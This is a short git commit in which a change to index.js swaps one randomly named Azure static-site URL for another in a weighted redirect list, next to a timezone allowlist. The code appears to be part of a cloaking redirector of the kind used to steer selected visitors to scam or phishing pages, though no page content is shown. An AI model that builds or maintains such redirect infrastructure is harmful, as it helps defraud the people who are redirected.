920ec91ef4f6d8734fd698f00019dec26aafbcc4
paalakash <palaksh452@gmail.com>
2026-07-11 11:47:11 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://5ghfjhgf.z5.web.core.windows.net/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://7sdjhkbsdv.z22.web.core.windows.net/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
